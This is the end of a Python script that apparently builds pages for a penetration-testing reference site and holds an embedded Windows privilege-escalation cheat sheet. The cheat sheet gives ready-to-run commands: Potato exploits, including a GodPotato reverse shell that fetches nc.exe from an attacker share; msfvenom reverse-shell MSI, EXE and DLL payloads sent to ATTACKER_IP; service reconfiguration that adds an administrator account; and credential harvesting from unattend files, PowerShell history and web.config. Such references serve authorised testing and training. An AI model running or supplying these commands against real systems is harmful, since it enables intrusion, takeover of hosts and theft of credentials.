# PrintSpoofer (Windows 10 / Server 2019+)
PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"

# JuicyPotatoNG (alternative)
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"

# SweetPotato
SweetPotato.exe -e EfsRpc -p c:\windows\system32\cmd.exe -a "/c whoami"

# Reverse shell via potato
GodPotato.exe -cmd "cmd /c \\\\&lt;ATTACKER_IP&gt;\\share\\nc.exe &lt;ATTACKER_IP&gt; 4444 -e cmd.exe"</code></pre>
</div>

<h3 id="alwaysinstallelevated">AlwaysInstallElevated</h3>
<p>MSI files install as SYSTEM when both HKLM and HKCU registry keys are set to 1.</p>
<div class="code-block">
<pre><code class="language-bash"># Check (must be 0x1 in BOTH hives)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create malicious MSI (Linux)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ATTACKER_IP&gt; LPORT=4444 -f msi -o shell.msi

# Install on target (runs as SYSTEM)
msiexec /quiet /qn /i C:\Users\Public\shell.msi</code></pre>
</div>

<h3 id="unquoted-service">Unquoted Service Paths</h3>
<div class="code-block">
<pre><code class="language-powershell"># Enumerate unquoted paths with spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v '\"'

# PowerShell
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select Name,PathName,StartMode

# Example: C:\Program Files\Vulnerable App\service.exe
# Place malicious binary at: C:\Program.exe  OR  C:\Program Files\Vulnerable.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ATTACKER_IP&gt; LPORT=4444 -f exe -o Program.exe
# Copy to writable location, restart service
sc stop &lt;SERVICE_NAME&gt;; sc start &lt;SERVICE_NAME&gt;</code></pre>
</div>

<h3 id="weak-service-perms">Weak Service Permissions</h3>
<div class="code-block">
<pre><code class="language-powershell"># Check service binary permissions (icacls)
icacls "C:\path\to\service.exe"

# Check service config permissions (accesschk)
accesschk.exe /accepteula -uwcqv &lt;USERNAME&gt; *        # all services
accesschk.exe /accepteula -uwcqv &lt;USERNAME&gt; &lt;SVC&gt;   # specific service

# If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:
sc config &lt;SERVICE_NAME&gt; binpath= "cmd.exe /c net user hacker P@ss123! /add"
sc stop &lt;SERVICE_NAME&gt;; sc start &lt;SERVICE_NAME&gt;
sc config &lt;SERVICE_NAME&gt; binpath= "cmd.exe /c net localgroup administrators hacker /add"
sc stop &lt;SERVICE_NAME&gt;; sc start &lt;SERVICE_NAME&gt;</code></pre>
</div>

<h3 id="dll-hijacking">DLL Hijacking</h3>
<div class="code-block">
<pre><code class="language-bash"># Find missing DLLs (Process Monitor on Windows, or static analysis)
# Look for: NAME NOT FOUND in DLL search path

# Create malicious DLL (Linux cross-compile)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ATTACKER_IP&gt; LPORT=4444 -f dll -o &lt;MISSING_DLL&gt;.dll

# Place in writable directory that appears before the legitimate DLL location
# Common writable dirs: C:\Users\Public\, C:\Temp\, application directory

# Phantom DLL: if the application tries to load a DLL that doesn't exist anywhere
# Order: app dir → System32 → System → Windows → CWD → PATH</code></pre>
</div>

<h3 id="scheduled-tasks-win">Scheduled Task Abuse</h3>
<div class="code-block">
<pre><code class="language-powershell"># List tasks running as SYSTEM with writable binary path
schtasks /query /fo LIST /v | findstr /i "task\|run as\|task to run"
Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq 'Highest'} | Select TaskName,TaskPath

# Check task binary permissions
icacls "&lt;TASK_BINARY_PATH&gt;"

# If writable: replace binary with malicious payload
copy shell.exe "&lt;TASK_BINARY_PATH&gt;"</code></pre>
</div>

<h3 id="stored-creds">Stored Credentials</h3>
<div class="code-block">
<pre><code class="language-powershell"># Credential Manager
cmdkey /list
runas /savecred /user:administrator cmd.exe

# Registry AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Unattended install files
dir /s /b C:\unattend.xml C:\sysprep.xml C:\sysprep.inf 2&gt;nul
dir /s /b C:\Windows\Panther\unattend.xml 2&gt;nul

# PowerShell history
type C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# IIS web.config (may contain DB creds)
type C:\inetpub\wwwroot\web.config | findstr /i "password connectionString"</code></pre>
</div>

<h3 id="token-abuse">Token Manipulation</h3>
<div class="code-block">
<pre><code class="language-powershell"># List available tokens
.\incognito.exe list_tokens -u

# Impersonate a token
.\incognito.exe execute -c "DOMAIN\Administrator" cmd.exe

# With Meterpreter: use_incognito then impersonate_token</code></pre>
</div>
"""

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    pages = [
        (
            "ad-kerberos",
            _page(
                "ad-kerberos",
                "Active Directory & Kerberos Attacks",
                "active-directory",
                "Kerberos",
                AD_KERBEROS_HTML,
                ["active-directory", "kerberos", "ad", "dcsync", "kerberoast", "asreproast",
                 "pass-the-hash", "pass-the-ticket", "bloodhound", "impacket"],
            ),
        ),
        (
            "adcs",
            _page(
                "adcs",
                "ADCS — Active Directory Certificate Services",
                "adcs",
                "ESC Attacks",
                ADCS_HTML,
                ["adcs", "certipy", "esc1", "esc4", "esc7", "esc8", "esc13",
                 "certificates", "active-directory", "pkinit"],
            ),
        ),
        (
            "nxc-reference",
            _page(
                "nxc-reference",
                "NetExec / CrackMapExec Reference",
                "tools",
                "NetExec",
                NXC_HTML,
                ["nxc", "crackmapexec", "cme", "smb", "winrm", "ldap", "mssql",
                 "lateral-movement", "enumeration"],
            ),
        ),
        (
            "linux-privesc",
            _page(
                "linux-privesc",
                "Linux Privilege Escalation",
                "linux",
                "Privilege Escalation",
                LINUX_PRIVESC_HTML,
                ["linux", "privesc", "privilege-escalation", "suid", "sudo",
                 "capabilities", "cron", "docker", "lxd", "gtfobins"],
            ),
        ),
        (
            "windows-privesc",
            _page(
                "windows-privesc",
                "Windows Privilege Escalation",
                "windows",
                "Privilege Escalation",
                WINDOWS_PRIVESC_HTML,
                ["windows", "privesc", "privilege-escalation", "seimpersonate",
                 "godpotato", "printspoofer", "dll-hijacking", "unquoted-service",
                 "alwaysinstallelevated", "token"],
            ),
        ),
    ]

    print(f"Writing {len(pages)} reference pages to {REF_DIR.relative_to(PROJECT_DIR)}/")
    for name, data in pages:
        _write(name, data)

    # Append reference entries to search index if it exists
    search_index_path = PROJECT_DIR / "static" / "search_index.json"
    if search_index_path.exists():
        with search_index_path.open("r", encoding="utf-8") as fh:
            index = json.load(fh)

        # Remove old built-in reference entries (by exact path, not prefix,
        # so vault reference files like reference/Windows/... are preserved)
        builtin_paths = {f"reference/{name}" for name, _ in pages}
        index = [e for e in index if e.get("path", "") not in builtin_paths]

        # Add new ones
        next_id = max((e.get("id", 0) for e in index), default=-1) + 1
        for i, (name, data) in enumerate(pages):
            index.append(
                {
                    "id": next_id + i,
                    "title": data["title"],
                    "category": data["category"],
                    "subcategory": data["subcategory"],
                    "path": data["path"],
                    "excerpt": data["excerpt"],
                    "tags": data["tags"],
                }
            )

        with search_index_path.open("w", encoding="utf-8") as fh:
            json.dump(index, fh, ensure_ascii=False, separators=(",", ":"))
        print(f"Updated search index ({len(index)} entries).")
    else:
        print("No search index found — run build.py first, then re-run add_content.py.")

    print("Done.")


if __name__ == "__main__":
    main()
